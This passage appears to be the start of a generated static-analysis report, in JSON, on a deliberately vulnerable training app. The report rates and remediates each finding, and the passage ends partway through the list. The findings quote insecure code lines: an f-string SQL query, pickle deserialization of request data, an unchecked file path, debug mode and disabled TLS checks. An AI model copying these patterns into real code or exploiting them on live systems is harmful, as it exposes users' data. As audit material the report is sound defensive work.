@@ -1,0 +1,3597 @@
+{
+  "report_version": "1.0",
+  "generated_at": "2026-10-23T19:20:03.887509Z",
+  "tool_version": "0.3.0",
+  "assessment": {
+    "id": "vulnapp-local",
+    "name": "vulnapp training fixture (local, offline)",
+    "types": [
+      "source_code",
+      "dependency_analysis",
+      "api_spec"
+    ]
+  },
+  "scope_summary": {
+    "assessment_id": "vulnapp-local",
+    "authorized": true,
+    "network_mode": "offline",
+    "types": [
+      "source_code",
+      "dependency_analysis",
+      "api_spec"
+    ],
+    "passive_checks": [],
+    "errors": [],
+    "warnings": []
+  },
+  "disclaimer": "This assessment is limited to the inputs, scope, tools and analysis methods listed in this report. It was performed in read-only mode: nothing was exploited, no payloads were sent, and no target state was changed. A GREEN result means no material issue was identified in the assessed component within that coverage; it does NOT mean the system is secure. Findings marked potential or unverified require safe manual verification. Financial figures, where present, are potential exposure estimates, not actual losses and not bounty predictions.",
+  "summary": {
+    "overall_zone": "RED",
+    "counts_by_zone": {
+      "RED": 2,
+      "YELLOW": 28
+    },
+    "counts_by_severity": {
+      "high": 16,
+      "critical": 1,
+      "medium": 9,
+      "low": 4
+    },
+    "counts_by_verification": {
+      "confirmed_static": 10,
+      "potential": 19,
+      "strongly_supported": 1
+    },
+    "counts_by_business_priority": {
+      "P1": 1,
+      "P2": 12,
+      "P3": 10,
+      "P4": 7
+    },
+    "business_context_source": "owner_provided"
+  },
+  "components": [
+    {
+      "name": "vulnapp",
+      "zone": "RED",
+      "covered_by": [
+        "semgrep",
+        "bandit",
+        "gitleaks",
+        "osv-scanner",
+        "builtin-supplychain",
+        "builtin-openapi"
+      ],
+      "finding_ids": [
+        "SA-CWE89-f0ffbdfe1dda",
+        "SA-CWE862-32e2b204d175",
+        "SA-CWE1395-575c59d1ab0e",
+        "SA-CWE22-20f07c388222",
+        "SA-CWE259-cd50df01e875",
+        "SA-CWE295-5a9091e977fe",
+        "SA-CWE489-af8b8327cc71",
+        "SA-CWE502-a4c90675842c",
+        "SA-CWE502-cc9c91b35af7",
+        "SA-CWE78-6956e11f61fa",
+        "SA-CWE841-3dc2d1f78292",
+        "SA-CWE95-e2c5fee2d296",
+        "SA-CWE639-f1987c925021",
+        "SA-CWE1395-20301f2d76bc",
+        "SA-CWE1395-7c30e220b78e",
+        "SA-CWE1395-b2cde1ba6726",
+        "SA-CWE1395-d40da4c54a86",
+        "SA-CWE829-29feb4c08358",
+        "SA-CWE306-96eb4643188a",
+        "SA-CWE319-cd5348b991da",
+        "SA-CWE605-2bdef207f461",
+        "SA-CWE798-a60a0caf6f12",
+        "SA-CWE840-049386d40d16",
+        "SA-CWE494-f118c64fa98e",
+        "SA-CWE78-5a21e2ded7a5",
+        "SA-CWE829-faaa3349d116",
+        "SA-CWE250-51fdf9d3461d",
+        "SA-CWE598-085a8c3b3eb4",
+        "SA-CWE829-58ccb551a969",
+        "SA-CWE829-7ddef4668ed8"
+      ]
+    }
+  ],
+  "findings": [
+    {
+      "title": "SQL query built from string formatting",
+      "category": "sql-injection",
+      "cwe": "CWE-89",
+      "component": "app",
+      "target_id": "vulnapp",
+      "locations": [
+        {
+          "role": "location",
+          "file": "app/app.py",
+          "start_line": 35,
+          "end_line": 35
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "code_excerpt",
+          "content": "    cur = db().execute(f\"SELECT name, price FROM products WHERE name LIKE '%{term}%'\")",
+          "file": "app/app.py",
+          "start_line": 35,
+          "end_line": 35,
+          "verified": true,
+          "verification_note": "matched lines 33-37"
+        }
+      ],
+      "description": "SQL query built with string formatting and passed to execute(); use parameterized queries.",
+      "preconditions": [
+        "Code path is reachable in the deployed configuration (not verified by the tool)."
+      ],
+      "attack_scenario": "Not established by the tool; requires analyst review of reachability and attacker control.",
+      "expected_boundary": "Untrusted input should not reach this operation without validation/authorization.",
+      "observed_behavior": "Pattern matched by semgrep rule workspace.projects.875dd5b0-fed6-440d-9d73-6a7abf69dc8a.work.sentinel-auditor.rules.semgrep.sentinel.python.sqli-fstring-execute.",
+      "technical_impact": "Depends on reachability and attacker control of the input.",
+      "severity": "high",
+      "severity_basis": "cvss",
+      "cvss": {
+        "version": "3.1",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "rationale": "Unauthenticated read via SQLi; sqlite3 blocks stacked statements, so I/A not claimed.",
+        "score": 7.5
+      },
+      "confidence": "medium",
+      "verification": {
+        "status": "confirmed_static",
+        "basis": [
+          "dataflow"
+        ],
+        "rationale": "Source request.args.get('q') (unauthenticated /search) flows into an f-string passed to db().execute with no binding.",
+        "reviewed_by": "sentinel-verifier",
+        "missing_prerequisites": [],
+        "alternative_explanations": []
+      },
+      "safe_validation": "Review the cited code and its callers statically; confirm attacker control of inputs using local tests against a disposable copy only. Do not test the live target.",
+      "remediation": "Use parameter placeholders (cursor.execute(sql, params)).",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/89.html",
+        "https://bandit.readthedocs.io/en/1.9.4/plugins/b608_hardcoded_sql_expressions.html"
+      ],
+      "limitations": [
+        "Detected by pattern-based tool (semgrep); reachability and exploitability not established.",
+        "Detected by pattern-based tool (bandit); reachability and exploitability not established."
+      ],
+      "source": {
+        "kind": "tool",
+        "name": "semgrep",
+        "rule_id": "workspace.projects.875dd5b0-fed6-440d-9d73-6a7abf69dc8a.work.sentinel-auditor.rules.semgrep.sentinel.python.sqli-fstring-execute",
+        "contributors": [
+          "bandit",
+          "semgrep"
+        ]
+      },
+      "fingerprint": "f0ffbdfe1dda",
+      "id": "SA-CWE89-f0ffbdfe1dda",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:54.907968Z",
+          "event": "added",
+          "actor": "semgrep"
+        },
+        {
+          "at": "2026-10-23T19:19:56.133436Z",
+          "event": "merged",
+          "from": "bandit"
+        },
+        {
+          "at": "2026-10-23T19:20:01.229552Z",
+          "event": "status",
+          "status": "confirmed_static",
+          "by": "sentinel-verifier"
+        }
+      ],
+      "claimed_confidence": "medium",
+      "risk_zone": "RED",
+      "business_impact": {
+        "technical_severity": "high",
+        "technical_priority": "P2",
+        "status": "assessed",
+        "asset_id": "shop-api",
+        "asset_criticality": "critical",
+        "asset_environment": "production",
+        "data_classes_at_risk": [
+          "pii",
+          "credentials"
+        ],
+        "business_priority": "P1",
+        "business_severity": "critical",
+        "program_expected_rating": {
+          "rating": "critical",
+          "matched_on": "sql-injection",
+          "scale": "custom",
+          "source": "fixtures/vulnapp/README.md (training fixture; values are illustrative)"
+        },
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": "sentinel-business-impact",
+        "notes": [
+          "reviewer raised one step: Hits the critical-tier shop-api asset (production, internet-exposed); the vulnerable query runs against the same database that stores customer PII and credentia"
+        ],
+        "submission_recommendation": {
+          "decision": "candidate_for_manual_submission",
+          "why": "verified with meaningful business priority; a human must review, check duplicates and program rules"
+        },
+        "business_scenario": "An unauthenticated visitor to the public /search endpoint could read the users table of the production shop: customer names, emails and password hashes.",
+        "assumptions": [
+          "Production database contains real customer records (owner-stated in business_context)"
+        ]
+      },
+      "business_review": {
+        "adjustment": 1,
+        "rationale": "Hits the critical-tier shop-api asset (production, internet-exposed); the vulnerable query runs against the same database that stores customer PII and credentials, so impact on this organization is above the generic CVSS reading.",
+        "affected_data_classes": [
+          "pii",
+          "credentials"
+        ],
+        "program_rating_ref": "business_context.program_severity.category_ratings.sql-injection = critical",
+        "business_scenario": "An unauthenticated visitor to the public /search endpoint could read the users table of the production shop: customer names, emails and password hashes.",
+        "assumptions": [
+          "Production database contains real customer records (owner-stated in business_context)"
+        ]
+      },
+      "business_reviewer": "sentinel-business-impact",
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "no estimate supplied",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    },
+    {
+      "target_id": "vulnapp",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/862.html"
+      ],
+      "limitations": [],
+      "preconditions": [
+        "Attacker holds any valid (non-admin) account"
+      ],
+      "title": "DELETE /admin/users/<id> lacks the admin role check its sibling enforces",
+      "category": "missing-authorization",
+      "cwe": "CWE-862",
+      "component": "app",
+      "locations": [
+        {
+          "file": "app/app.py",
+          "start_line": 59,
+          "end_line": 65,
+          "function": "delete_user",
+          "role": "sink"
+        },
+        {
+          "file": "app/app.py",
+          "start_line": 68,
+          "end_line": 74,
+          "function": "promote_user",
+          "role": "check"
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "code_excerpt",
+          "file": "app/app.py",
+          "start_line": 59,
+          "end_line": 63,
+          "content": "@app.route(\"/admin/users/<int:user_id>\", methods=[\"DELETE\"])\n@login_required\ndef delete_user(user_id):\n    db().execute(\"DELETE FROM users WHERE id = ?\", (user_id,))",
+          "verified": true,
+          "verification_note": "matched lines 57-65"
+        },
+        {
+          "kind": "code_excerpt",
+          "file": "app/app.py",
+          "start_line": 68,
+          "end_line": 71,
+          "content": "@app.route(\"/admin/users/<int:user_id>/promote\", methods=[\"POST\"])\n@login_required\n@require_role(\"admin\")",
+          "verified": true,
+          "verification_note": "matched lines 66-73"
+        }
+      ],
+      "description": "delete_user is an admin route guarded only by login_required, while the adjacent promote_user also applies require_role(\"admin\"). The OpenAPI spec additionally declares this DELETE with security: [].",
+      "attack_scenario": "A regular user issues DELETE /admin/users/<id> and the account row is deleted. (Not executed.)",
+      "expected_boundary": "Only administrators can delete users.",
+      "observed_behavior": "Any authenticated user passes the only guard.",
+      "technical_impact": "Unauthorized deletion of arbitrary user accounts (integrity/availability).",
+      "severity": "high",
+      "confidence": "high",
+      "verification": {
+        "status": "confirmed_static",
+        "rationale": "delete_user carries only @login_required while promote_user adds @require_role('admin'); no global role check exists.",
+        "reviewed_by": "sentinel-verifier",
+        "basis": [],
+        "missing_prerequisites": [],
+        "alternative_explanations": []
+      },
+      "safe_validation": "Static comparison of decorators; confirm no global before_request role check exists.",
+      "remediation": "Add @require_role(\"admin\") to delete_user and a regression test asserting 403 for non-admins.",
+      "source": {
+        "kind": "agent",
+        "name": "sentinel-authz"
+      },
+      "fingerprint": "32e2b204d175",
+      "id": "SA-CWE862-32e2b204d175",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:59.796214Z",
+          "event": "added",
+          "actor": "sentinel-authz"
+        },
+        {
+          "at": "2026-10-23T19:20:00.893836Z",
+          "event": "status",
+          "status": "confirmed_static",
+          "by": "sentinel-verifier"
+        }
+      ],
+      "severity_basis": "cvss",
+      "claimed_confidence": "high",
+      "risk_zone": "RED",
+      "business_impact": {
+        "technical_severity": "high",
+        "technical_priority": "P2",
+        "status": "assessed",
+        "asset_id": "shop-api",
+        "asset_criticality": "critical",
+        "asset_environment": "production",
+        "data_classes_at_risk": [
+          "pii",
+          "payment",
+          "credentials",
+          "authentication"
+        ],
+        "business_priority": "P2",
+        "business_severity": "high",
+        "program_expected_rating": {
+          "rating": "high",
+          "matched_on": "missing-authorization",
+          "scale": "custom",
+          "source": "fixtures/vulnapp/README.md (training fixture; values are illustrative)"
+        },
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": null,
+        "notes": [],
+        "submission_recommendation": {
+          "decision": "candidate_for_manual_submission",
+          "why": "verified with meaningful business priority; a human must review, check duplicates and program rules"
+        }
+      },
+      "cvss": {
+        "version": "3.1",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H",
+        "rationale": "Any account deletes arbitrary users.",
+        "score": 8.1
+      },
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "rejected estimate: aggregate metrics (TVL/volume/valuation/balances) require an evidenced exposure_fraction input",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    },
+    {
+      "title": "pyyaml 5.3 has 2 known vulnerabilities (CVE-2020-14343, CVE-2020-1747)",
+      "category": "vulnerable-dependency",
+      "cwe": "CWE-1395",
+      "component": "requirements.txt",
+      "target_id": "vulnapp",
+      "locations": [
+        {
+          "role": "location",
+          "file": "requirements.txt",
+          "start_line": 2,
+          "end_line": 2
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "config_excerpt",
+          "content": "pyyaml==5.3",
+          "file": "requirements.txt",
+          "start_line": 2,
+          "end_line": 2,
+          "verified": true,
+          "verification_note": "matched lines 1-4"
+        }
+      ],
+      "description": "PYSEC-2020-96; PYSEC-2021-142; Improper Input Validation in PyYAML; Improper Input Validation in PyYAML",
+      "preconditions": [
+        "Code path is reachable in the deployed configuration (not verified by the tool)."
+      ],
+      "attack_scenario": "Not established by the tool; requires analyst review of reachability and attacker control.",
+      "expected_boundary": "Untrusted input should not reach this operation without validation/authorization.",
+      "observed_behavior": "Pattern matched by osv-scanner rule PyPI:pyyaml@5.3.",
+      "technical_impact": "Depends on whether the application uses the vulnerable functionality.",
+      "severity": "critical",
+      "severity_basis": "cvss",
+      "cvss": {
+        "version": "3.1",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "rationale": "Highest upstream advisory base vector among the package's advisories; application reachability not assessed.",
+        "score": 9.8
+      },
+      "confidence": "medium",
+      "verification": {
+        "status": "potential",
+        "basis": [
+          "tool:osv-scanner"
+        ]
+      },
+      "safe_validation": "Review the cited code and its callers statically; confirm attacker control of inputs using local tests against a disposable copy only. Do not test the live target.",
+      "remediation": "Upgrade pyyaml to a version that fixes all listed advisories; verify compatibility.",
+      "references": [
+        "https://osv.dev/vulnerability/CVE-2020-14343",
+        "https://osv.dev/vulnerability/CVE-2020-1747"
+      ],
+      "limitations": [
+        "Version match only; reachability of vulnerable code not established.",
+        "Upstream CVSS describes the library, not this application."
+      ],
+      "source": {
+        "kind": "tool",
+        "name": "osv-scanner",
+        "rule_id": "PyPI:pyyaml@5.3"
+      },
+      "fingerprint": "575c59d1ab0e",
+      "id": "SA-CWE1395-575c59d1ab0e",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:59.537768Z",
+          "event": "added",
+          "actor": "osv-scanner"
+        },
+        {
+          "at": "2026-10-23T19:19:59.576406Z",
+          "event": "score",
+          "note": "severity medium -> critical to match CVSS 9.8"
+        }
+      ],
+      "claimed_confidence": "medium",
+      "risk_zone": "YELLOW",
+      "business_impact": {
+        "technical_severity": "critical",
+        "technical_priority": "P1",
+        "status": "assessed",
+        "asset_id": "build-and-ci",
+        "asset_criticality": "medium",
+        "asset_environment": "production",
+        "data_classes_at_risk": [
+          "secrets"
+        ],
+        "business_priority": "P2",
+        "business_severity": "high",
+        "program_expected_rating": null,
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": null,
+        "notes": [
+          "not internet-exposed (-1)"
+        ],
+        "submission_recommendation": {
+          "decision": "needs_more_evidence",
+          "why": "not independently verified; do not submit as-is"
+        }
+      },
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "no estimate supplied",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    },
+    {
+      "title": "Request-controlled file path",
+      "category": "path-traversal",
+      "cwe": "CWE-22",
+      "component": "app",
+      "target_id": "vulnapp",
+      "locations": [
+        {
+          "role": "location",
+          "file": "app/app.py",
+          "start_line": 43,
+          "end_line": 43
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "code_excerpt",
+          "content": "    return send_file(os.path.join(BASE_DIR, name))",
+          "file": "app/app.py",
+          "start_line": 43,
+          "end_line": 43,
+          "verified": true,
+          "verification_note": "matched lines 41-45"
+        }
+      ],
+      "description": "File path derived from request data reaches a file API without normalization/containment checks.",
+      "preconditions": [
+        "Code path is reachable in the deployed configuration (not verified by the tool)."
+      ],
+      "attack_scenario": "Not established by the tool; requires analyst review of reachability and attacker control.",
+      "expected_boundary": "Untrusted input should not reach this operation without validation/authorization.",
+      "observed_behavior": "Pattern matched by semgrep rule workspace.projects.875dd5b0-fed6-440d-9d73-6a7abf69dc8a.work.sentinel-auditor.rules.semgrep.sentinel.python.flask-path-traversal.",
+      "technical_impact": "Depends on reachability and attacker control of the input.",
+      "severity": "high",
+      "severity_basis": "tool_default",
+      "cvss": null,
+      "confidence": "medium",
+      "verification": {
+        "status": "potential",
+        "basis": [
+          "tool:semgrep"
+        ]
+      },
+      "safe_validation": "Review the cited code and its callers statically; confirm attacker control of inputs using local tests against a disposable copy only. Do not test the live target.",
+      "remediation": "Use werkzeug.utils.safe_join / send_from_directory and validate against an allowlist.",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/22.html"
+      ],
+      "limitations": [
+        "Detected by pattern-based tool (semgrep); reachability and exploitability not established."
+      ],
+      "source": {
+        "kind": "tool",
+        "name": "semgrep",
+        "rule_id": "workspace.projects.875dd5b0-fed6-440d-9d73-6a7abf69dc8a.work.sentinel-auditor.rules.semgrep.sentinel.python.flask-path-traversal"
+      },
+      "fingerprint": "20f07c388222",
+      "id": "SA-CWE22-20f07c388222",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:54.909405Z",
+          "event": "added",
+          "actor": "semgrep"
+        }
+      ],
+      "claimed_confidence": "medium",
+      "risk_zone": "YELLOW",
+      "business_impact": {
+        "technical_severity": "high",
+        "technical_priority": "P2",
+        "status": "assessed",
+        "asset_id": "shop-api",
+        "asset_criticality": "critical",
+        "asset_environment": "production",
+        "data_classes_at_risk": [
+          "pii",
+          "payment",
+          "credentials",
+          "authentication"
+        ],
+        "business_priority": "P2",
+        "business_severity": "high",
+        "program_expected_rating": null,
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": null,
+        "notes": [],
+        "submission_recommendation": {
+          "decision": "needs_more_evidence",
+          "why": "not independently verified; do not submit as-is"
+        }
+      },
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "no estimate supplied",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    },
+    {
+      "title": "hardcoded password string: Possible hardcoded password: 'q8Vb…[REDACTED]'",
+      "category": "hardcoded-secret",
+      "cwe": "CWE-259",
+      "component": "app",
+      "target_id": "vulnapp",
+      "locations": [
+        {
+          "role": "location",
+          "file": "app/config.py",
+          "start_line": 5,
+          "end_line": 5
+        },
+        {
+          "role": "location",
+          "file": "app/config.py",
+          "start_line": 4,
+          "end_line": 4
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "code_excerpt",
+          "content": "AWS_…[REDACTED]",
+          "file": "app/config.py",
+          "start_line": 5,
+          "end_line": 5,
+          "verified": true,
+          "verification_note": "matched lines 3-7"
+        },
+        {
+          "kind": "code_excerpt",
+          "content": "AWS_ACCESS_KEY_ID = \"AKIA…[REDACTED]\"",
+          "file": "app/config.py",
+          "start_line": 4,
+          "end_line": 4,
+          "verified": true,
+          "verification_note": "matched lines 2-6"
+        }
+      ],
+      "description": "Possible hardcoded password: 'q8Vb…[REDACTED]'",
+      "preconditions": [
+        "Code path is reachable in the deployed configuration (not verified by the tool)."
+      ],
+      "attack_scenario": "Not established by the tool; requires analyst review of reachability and attacker control.",
+      "expected_boundary": "Untrusted input should not reach this operation without validation/authorization.",
+      "observed_behavior": "Pattern matched by bandit rule B105.",
+      "technical_impact": "See CWE; impact depends on reachability.",
+      "severity": "high",
+      "severity_basis": "tool_default",
+      "cvss": null,
+      "confidence": "medium",
+      "verification": {
+        "status": "potential",
+        "basis": [
+          "tool:bandit"
+        ]
+      },
+      "safe_validation": "Review the cited code and its callers statically; confirm attacker control of inputs using local tests against a disposable copy only. Do not test the live target.",
+      "remediation": "See https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "references": [
+        "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+        "https://cwe.mitre.org/data/definitions/798.html"
+      ],
+      "limitations": [
+        "Detected by pattern-based tool (bandit); reachability and exploitability not established.",
+        "Liveness of the credential was deliberately NOT tested (policy)."
+      ],
+      "source": {
+        "kind": "tool",
+        "name": "bandit",
+        "rule_id": "B105",
+        "contributors": [
+          "bandit",
+          "gitleaks"
+        ]
+      },
+      "fingerprint": "cd50df01e875",
+      "id": "SA-CWE259-cd50df01e875",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:56.139080Z",
+          "event": "added",
+          "actor": "bandit"
+        },
+        {
+          "at": "2026-10-23T19:19:56.574020Z",
+          "event": "merged",
+          "from": "gitleaks"
+        },
+        {
+          "at": "2026-10-23T19:19:56.575171Z",
+          "event": "merged",
+          "from": "gitleaks"
+        }
+      ],
+      "claimed_confidence": "medium",
+      "risk_zone": "YELLOW",
+      "business_impact": {
+        "technical_severity": "high",
+        "technical_priority": "P2",
+        "status": "assessed",
+        "asset_id": "shop-api",
+        "asset_criticality": "critical",
+        "asset_environment": "production",
+        "data_classes_at_risk": [
+          "pii",
+          "payment",
+          "credentials",
+          "authentication"
+        ],
+        "business_priority": "P2",
+        "business_severity": "high",
+        "program_expected_rating": {
+          "rating": "high",
+          "matched_on": "hardcoded-secret",
+          "scale": "custom",
+          "source": "fixtures/vulnapp/README.md (training fixture; values are illustrative)"
+        },
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": null,
+        "notes": [],
+        "submission_recommendation": {
+          "decision": "needs_more_evidence",
+          "why": "not independently verified; do not submit as-is"
+        }
+      },
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "no estimate supplied",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    },
+    {
+      "title": "TLS verification disabled",
+      "category": "tls-verification-disabled",
+      "cwe": "CWE-295",
+      "component": "app",
+      "target_id": "vulnapp",
+      "locations": [
+        {
+          "role": "location",
+          "file": "app/config.py",
+          "start_line": 10,
+          "end_line": 10
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "code_excerpt",
+          "content": "    return requests.get(\"https://rates.example.com/v1\", verify=False, timeout=5).json()",
+          "file": "app/config.py",
+          "start_line": 10,
+          "end_line": 10,
+          "verified": true,
+          "verification_note": "matched lines 8-10"
+        }
+      ],
+      "description": "TLS certificate verification disabled.",
+      "preconditions": [
+        "Code path is reachable in the deployed configuration (not verified by the tool)."
+      ],
+      "attack_scenario": "Not established by the tool; requires analyst review of reachability and attacker control.",
+      "expected_boundary": "Untrusted input should not reach this operation without validation/authorization.",
+      "observed_behavior": "Pattern matched by semgrep rule workspace.projects.875dd5b0-fed6-440d-9d73-6a7abf69dc8a.work.sentinel-auditor.rules.semgrep.sentinel.python.requests-verify-false.",
+      "technical_impact": "Depends on reachability and attacker control of the input.",
+      "severity": "high",
+      "severity_basis": "tool_default",
+      "cvss": null,
+      "confidence": "medium",
+      "verification": {
+        "status": "potential",
+        "basis": [
+          "tool:semgrep"
+        ]
+      },
+      "safe_validation": "Review the cited code and its callers statically; confirm attacker control of inputs using local tests against a disposable copy only. Do not test the live target.",
+      "remediation": "Remove verify=False; pin a CA bundle if needed.",
+      "references": [
+        "https://bandit.readthedocs.io/en/1.9.4/plugins/b501_request_with_no_cert_validation.html"
+      ],
+      "limitations": [
+        "Detected by pattern-based tool (semgrep); reachability and exploitability not established.",
+        "Detected by pattern-based tool (bandit); reachability and exploitability not established."
+      ],
+      "source": {
+        "kind": "tool",
+        "name": "semgrep",
+        "rule_id": "workspace.projects.875dd5b0-fed6-440d-9d73-6a7abf69dc8a.work.sentinel-auditor.rules.semgrep.sentinel.python.requests-verify-false",
+        "contributors": [
+          "bandit",
+          "semgrep"
+        ]
+      },
+      "fingerprint": "5a9091e977fe",
+      "id": "SA-CWE295-5a9091e977fe",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:54.914292Z",
+          "event": "added",
+          "actor": "semgrep"
+        },
+        {
+          "at": "2026-10-23T19:19:56.140111Z",
+          "event": "merged",
+          "from": "bandit"
+        }
+      ],
+      "claimed_confidence": "medium",
+      "risk_zone": "YELLOW",
+      "business_impact": {
+        "technical_severity": "high",
+        "technical_priority": "P2",
+        "status": "assessed",
+        "asset_id": "shop-api",
+        "asset_criticality": "critical",
+        "asset_environment": "production",
+        "data_classes_at_risk": [
+          "pii",
+          "payment",
+          "credentials",
+          "authentication"
+        ],
+        "business_priority": "P2",
+        "business_severity": "high",
+        "program_expected_rating": null,
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": null,
+        "notes": [],
+        "submission_recommendation": {
+          "decision": "needs_more_evidence",
+          "why": "not independently verified; do not submit as-is"
+        }
+      },
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "no estimate supplied",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    },
+    {
+      "title": "Flask debug mode enabled",
+      "category": "debug-enabled",
+      "cwe": "CWE-489",
+      "component": "app",
+      "target_id": "vulnapp",
+      "locations": [
+        {
+          "role": "location",
+          "file": "app/app.py",
+          "start_line": 93,
+          "end_line": 93
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "code_excerpt",
+          "content": "    app.run(host=\"0.0.0.0\", debug=True)",
+          "file": "app/app.py",
+          "start_line": 93,
+          "end_line": 93,
+          "verified": true,
+          "verification_note": "matched lines 91-93"
+        }
+      ],
+      "description": "Flask debug mode exposes the Werkzeug debugger (code execution) if reachable.",
+      "preconditions": [
+        "Code path is reachable in the deployed configuration (not verified by the tool)."
+      ],
+      "attack_scenario": "Not established by the tool; requires analyst review of reachability and attacker control.",
+      "expected_boundary": "Untrusted input should not reach this operation without validation/authorization.",
+      "observed_behavior": "Pattern matched by semgrep rule workspace.projects.875dd5b0-fed6-440d-9d73-6a7abf69dc8a.work.sentinel-auditor.rules.semgrep.sentinel.python.flask-debug.",
+      "technical_impact": "Depends on reachability and attacker control of the input.",
+      "severity": "high",
+      "severity_basis": "tool_default",
+      "cvss": null,
+      "confidence": "medium",
+      "verification": {
+        "status": "potential",
+        "basis": [
+          "tool:semgrep"
+        ]
+      },
+      "safe_validation": "Review the cited code and its callers statically; confirm attacker control of inputs using local tests against a disposable copy only. Do not test the live target.",
+      "remediation": "See rule references.",
+      "references": [
+        "https://bandit.readthedocs.io/en/1.9.4/plugins/b201_flask_debug_true.html"
+      ],
+      "limitations": [
+        "Detected by pattern-based tool (semgrep); reachability and exploitability not established.",
+        "Detected by pattern-based tool (bandit); reachability and exploitability not established."
+      ],
+      "source": {
+        "kind": "tool",
+        "name": "semgrep",
+        "rule_id": "workspace.projects.875dd5b0-fed6-440d-9d73-6a7abf69dc8a.work.sentinel-auditor.rules.semgrep.sentinel.python.flask-debug",
+        "contributors": [
+          "bandit",
+          "semgrep"
+        ]
+      },
+      "fingerprint": "af8b8327cc71",
+      "id": "SA-CWE489-af8b8327cc71",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:54.913151Z",
+          "event": "added",
+          "actor": "semgrep"
+        },
+        {
+          "at": "2026-10-23T19:19:56.137003Z",
+          "event": "merged",
+          "from": "bandit"
+        }
+      ],
+      "claimed_confidence": "medium",
+      "risk_zone": "YELLOW",
+      "business_impact": {
+        "technical_severity": "high",
+        "technical_priority": "P2",
+        "status": "assessed",
+        "asset_id": "shop-api",
+        "asset_criticality": "critical",
+        "asset_environment": "production",
+        "data_classes_at_risk": [
+          "pii",
+          "payment",
+          "credentials",
+          "authentication"
+        ],
+        "business_priority": "P2",
+        "business_severity": "high",
+        "program_expected_rating": null,
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": null,
+        "notes": [],
+        "submission_recommendation": {
+          "decision": "needs_more_evidence",
+          "why": "not independently verified; do not submit as-is"
+        }
+      },
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "no estimate supplied",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    },
+    {
+      "title": "Pickle deserialization of request data",
+      "category": "deserialization",
+      "cwe": "CWE-502",
+      "component": "app",
+      "target_id": "vulnapp",
+      "locations": [
+        {
+          "role": "location",
+          "file": "app/app.py",
+          "start_line": 56,
+          "end_line": 56
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "code_excerpt",
+          "content": "    return jsonify(pickle.loads(bytes.fromhex(raw)) if raw else {})",
+          "file": "app/app.py",
+          "start_line": 56,
+          "end_line": 56,
+          "verified": true,
+          "verification_note": "matched lines 54-58"
+        }
+      ],
+      "description": "pickle.loads on request-derived data allows arbitrary code execution during deserialization.",
+      "preconditions": [
+        "Code path is reachable in the deployed configuration (not verified by the tool)."
+      ],
+      "attack_scenario": "Not established by the tool; requires analyst review of reachability and attacker control.",
+      "expected_boundary": "Untrusted input should not reach this operation without validation/authorization.",
+      "observed_behavior": "Pattern matched by semgrep rule workspace.projects.875dd5b0-fed6-440d-9d73-6a7abf69dc8a.work.sentinel-auditor.rules.semgrep.sentinel.python.pickle-untrusted.",
+      "technical_impact": "Depends on reachability and attacker control of the input.",
+      "severity": "high",
+      "severity_basis": "tool_default",
+      "cvss": null,
+      "confidence": "medium",
+      "verification": {
+        "status": "potential",
+        "basis": [
+          "tool:semgrep"
+        ]
+      },
